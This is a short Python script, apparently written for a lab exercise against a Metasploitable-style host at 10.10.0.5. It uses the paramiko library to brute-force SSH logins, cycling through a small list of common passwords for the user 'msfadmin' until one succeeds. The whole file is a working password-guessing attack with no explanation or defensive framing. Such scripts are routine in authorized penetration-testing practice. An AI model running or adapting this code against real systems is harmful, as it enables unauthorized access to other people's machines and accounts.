import paramiko  


target_ip = '10.10.0.5'
username = 'msfadmin'
passwords = ['12345', 'password', 'admin123', 'toor', 'msfadmin'] 


client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())


for password in passwords:
    try:
        print(f"Trying password: {password}")
        client.connect(target_ip, username=username, password=password)
        print(f"Successful login with password: {password}")
        break
    except paramiko.AuthenticationException:
        print(f"Failed attempt with password: {password}")

client.close()
